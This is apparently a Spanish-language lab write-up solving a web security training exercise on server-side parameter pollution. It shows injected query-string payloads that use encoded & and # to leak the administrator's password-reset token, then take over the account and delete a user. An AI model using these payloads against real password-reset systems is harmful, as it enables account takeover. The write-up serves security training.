
---

## ğŸ§ª Lab: ExplotaciÃ³n de Server-Side Parameter Pollution en Query String

**Objetivo**: Iniciar sesiÃ³n como **administrator** y eliminar al usuario **carlos**.

---

### ğŸ” 1. Trigger del reset de contraseÃ±a

- Ir al navegador de Burp.
    
- Iniciar el proceso de "Â¿Olvidaste tu contraseÃ±a?" para el usuario `administrator`.
    
- En **Proxy > HTTP history**, observar:
    
    - `POST /forgot-password`
        
    - `GET /static/js/forgotPassword.js`
        

---

### ğŸ“¤ 2. Analizar la solicitud POST

- Enviar `POST /forgot-password` al **Repeater**.
    
- En Repeater:
    
    - Confirmar que el request con `username=administrator` da respuesta normal.
        ![image](https://github.com/user-attachments/assets/bcb42ad7-227d-4814-b2eb-838067038a58)

    - Probar con `username=administratorx` â†’ da error `Invalid username`.
        ![image](https://github.com/user-attachments/assets/214c0dad-c456-41a1-813d-a28b408f7b49)


---

### ğŸ’‰ 3. Probar inyecciÃ³n de parÃ¡metro con `%26` (`&` codificado)

- Probar:
    
    ```
    username=administrator%26x=y
    ```
    
    Resultado: `Parameter is not supported` â†’ ğŸ’¡ hay un intento de interpretar `x=y` como parÃ¡metro vÃ¡lido.
    ![image](https://github.com/user-attachments/assets/04cff10f-d9cd-41b5-a877-a39013cf45ec)


---

### âœ‚ï¸ 4. Probar truncamiento con `%23` (`#` codificado)

- Probar:
    
    ```
    username=administrator%23
    ```
    
    Resultado: `Field not specified` â†’ ğŸ’¡ se eliminÃ³ probablemente un campo requerido.
    ![image](https://github.com/user-attachments/assets/b05f1888-e4fb-4234-af6d-d93a99025a72)


---

### ğŸ§ª 5. Inyectar y truncar parÃ¡metro `field`

- Probar:
    
    ```
    username=administrator%26field=x%23
    ```
    
    Resultado: `Invalid field` â†’ ğŸ’¡ el campo `field` es reconocido.
    ![image](https://github.com/user-attachments/assets/113349b0-73fb-4e1c-afcb-12a76b4b4f80)


---

### ğŸ” 6. Fuerza bruta de `field`

- Enviar a **Intruder**:
    
    - Payload:
        
        ```
        username=administrator%26field=Â§xÂ§%23
        ```
        
    - Lista: `Server-side variable names`
        
    - Resultado: `email` y `username` dan respuesta 200.
        ![image](https://github.com/user-attachments/assets/0edcd4b6-4b3f-47b3-bb7f-3e9dbd34bba4)


---

### ğŸ§  7. Buscar token de reseteo

- En `/static/js/forgotPassword.js` aparece:
    
    ```
    /forgot-password?reset_token=${resetToken}
    ```
    
- En Repeater, probar:
    
    ```
    username=administrator%26field=reset_token%23
    ```
    
- ğŸ’¥ Se obtiene el `reset_token`.
    ![image](https://github.com/user-attachments/assets/27bf0591-e25a-46b0-bda4-85e276e2e4c7)

```css
{
  "type":"reset_token",
  "result":"<token>"
}
```

---

### ğŸ”‘ 8. Resetear contraseÃ±a del administrador

- En el navegador:
    
    ```
    /forgot-password?reset_token=<token>
    ```
    
- Establecer nueva contraseÃ±a.
    ![image](https://github.com/user-attachments/assets/8e6e81e9-c400-4011-a0d9-28adef6a61db)


---

### âœ… 9. Iniciar sesiÃ³n como `administrator`

- Entrar al panel de administraciÃ³n.
    
- Eliminar al usuario `carlos`.
    

âœ… **Â¡Lab resuelto!**
![image](https://github.com/user-attachments/assets/64dad018-effb-4172-b8e5-95c434b24507)

---

